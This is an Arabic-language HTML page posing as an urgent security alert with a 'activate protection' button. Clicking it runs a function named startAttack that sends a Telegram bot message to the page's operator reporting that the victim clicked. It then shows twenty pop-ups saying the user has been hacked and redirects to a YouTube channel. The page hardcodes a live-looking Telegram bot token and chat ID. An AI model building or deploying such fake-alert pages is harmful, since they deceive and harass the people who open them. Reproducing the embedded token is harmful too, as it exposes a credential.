<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تنبيه أمني عاجل</title>
    <style>
        body { font-family: sans-serif; background: #000; color: #fff; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #f00; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #f00; }
        button { background: #f00; color: #fff; padding: 20px 40px; border: none; border-radius: 10px; font-weight: bold; font-size: 1.2rem; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <h1>⚠️ تم اكتشاف اختراق!</h1>
    <p>اضغط لتفعيل نظام الحماية الفوري ومنع سحب البيانات.</p>
    <button onclick="startAttack()">تفعيل الحماية</button>
</div>

<script>
    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
    const chat = "8042090388";

    function startAttack() {
        // إرسال تنبيه لتليجرام فور الضغط
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text: "🔥 بدأ الهجوم! الضحية ضغط على الزر والآن الرسائل تظهر له." })
        });

        // تنفيذ قصف الرسائل عبر التنبيهات المتكررة (Alerts)
        let count = 0;
        const messages = "تم اختراقك من عمك @ll._911";

        function showNext() {
            if (count < 20) {
                count++;
                alert(messages + " (" + count + "/20)");
                // نستخدم setTimeout لخلق فاصل 5 ثواني كما طلبت
                setTimeout(showNext, 5000); 
            } else {
                window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
            }
        }

        showNext();
    }
</script>

</body>
</html>
